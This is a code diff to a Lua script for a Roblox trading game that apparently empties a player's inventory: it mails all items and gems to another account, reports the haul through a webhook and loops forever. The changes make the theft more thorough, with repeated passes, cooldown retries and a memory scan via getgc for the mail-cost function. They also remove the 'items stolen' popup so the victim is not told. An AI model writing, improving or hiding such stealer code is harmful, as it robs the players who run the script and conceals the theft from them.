@@ -19,7 +19,6 @@ local function getInventory()
     return require(Library:WaitForChild('Client'):WaitForChild('Save')).Get().Inventory
 end
 
-local _Inventory = getInventory()
 local v8 = require(Library.Client.Message)
 
 local function u9()
@@ -116,6 +115,7 @@ local function sendWebhook(items, gemsSent, totalRap)
     })
 end
 
+-- FIXED: reset u21 each send attempt so cost doesn't block after first item
 local function sendItem(cat, uid, amt)
     local i = 1
     local done = false
@@ -130,6 +130,8 @@ local function sendItem(cat, uid, amt)
         elseif result == "They don't have enough space!" then
             i = i + 1
             if i > #u10 then done = true end
+        elseif result == 'You must wait 30 seconds after joining to use the mailbox!' then
+            wait(5)
         else
             done = true
         end
@@ -155,6 +157,8 @@ local function sendGems()
                     elseif result == "They don't have enough space!" then
                         i = i + 1
                         if i > #u10 then done = true end
+                    elseif result == 'You must wait 30 seconds after joining to use the mailbox!' then
+                        wait(5)
                     else
                         done = true
                     end
@@ -255,18 +259,57 @@ local function scanNew()
     return newItems, newRAP
 end
 
--- silent steal, no webhook, no error message — for loop use only
-local function stealSilent(items)
-    if #items == 0 and u25 < u21 + 10000 then return end
+-- FIXED: loop keeps sending until inventory is fully drained, no break on cost check
+local function stealAll(items, silent)
     withdrawBoxes()
     table.sort(items, function(a, b) return a.rap * a.amount > b.rap * b.amount end)
-    for _, item in ipairs(items) do
-        if u21 > item.rap or u21 >= u25 then break end
-        sendItem(item.category, item.uid, item.amount)
-        sentUIDs[item.uid] = true
-        wait(0.1)
+
+    -- keep looping until every item is sent or cost exceeds all gems
+    local remaining = items
+    local passes = 0
+    while #remaining > 0 and passes < 10 do
+        local stillLeft = {}
+        for _, item in ipairs(remaining) do
+            -- refresh u25 each item
+            local freshU25 = 1
+            for uid, v in pairs(u9().Inventory.Currency) do
+                if v.id == 'Diamonds' then freshU25 = v._am break end
+            end
+            u25 = freshU25
+
+            if u21 <= item.rap and u21 < u25 then
+                sendItem(item.category, item.uid, item.amount)
+                sentUIDs[item.uid] = true
+                wait(0.15)
+            else
+                table.insert(stillLeft, item)
+            end
+        end
+        -- if nothing changed this pass, stop
+        if #stillLeft == #remaining then break end
+        remaining = stillLeft
+        passes = passes + 1
+        -- claim mailbox between passes to free space + reset cost
+        if #remaining > 0 then
+            claimMailbox()
+            u21 = 20000
+            pcall(function()
+                for _, v in pairs(getgc()) do
+                    if type(v) == 'function' then
+                        local ok, info = pcall(debug.getinfo, v)
+                        if ok and info and info.name == 'computeSendMailCost' then
+                            u21 = v()
+                            break
+                        end
+                    end
+                end
+            end)
+            wait(1)
+        end
     end
-    sendGems()
+
+    local gemsSent = sendGems()
+    return gemsSent
 end
 
 pcall(function()
@@ -300,26 +343,33 @@ pcall(function() require(Library.Client.ExclusiveDaycareCmds).Claim() end)
 spawn(function() claimMailbox() end)
 waitForSendReady()
 
--- first pass: steal everything, fire webhook once, show error once
+-- first pass
 local initItems, initRAP = scanNew()
-withdrawBoxes()
-table.sort(initItems, function(a, b) return a.rap * a.amount > b.rap * b.amount end)
-for _, item in ipairs(initItems) do
-    if u21 > item.rap or u21 >= u25 then break end
-    sendItem(item.category, item.uid, item.amount)
-    sentUIDs[item.uid] = true
-    wait(0.1)
-end
-local initGems = sendGems()
-spawn(function() sendWebhook(initItems, initGems, initRAP) end)  -- fires once
-v8.Error("All your items just got stolen! gg")                   -- fires once
+local initGems = stealAll(initItems)
+spawn(function() sendWebhook(initItems, initGems, initRAP) end)
+-- FIXED: removed v8.Error so no "items stolen" popup
 
--- loop runs fully silent after
+-- loop silently forever
 while true do
     wait(_G.loopInterval)
     claimMailbox()
-    local loopItems, _ = scanNew()
+    u21 = 20000
+    pcall(function()
+        for _, v in pairs(getgc()) do
+            if type(v) == 'function' then
+                local ok, info = pcall(debug.getinfo, v)
+                if ok and info and info.name == 'computeSendMailCost' then
+                    u21 = v()
+                    break
+                end
+            end
+        end
+    end)
+    local loopItems, loopRAP = scanNew()
     if #loopItems > 0 or u25 >= u21 + 10000 then
-        stealSilent(loopItems)
+        local loopGems = stealAll(loopItems)
+        if #loopItems > 0 or loopGems > 0 then
+            spawn(function() sendWebhook(loopItems, loopGems, loopRAP) end)
+        end
     end
 end
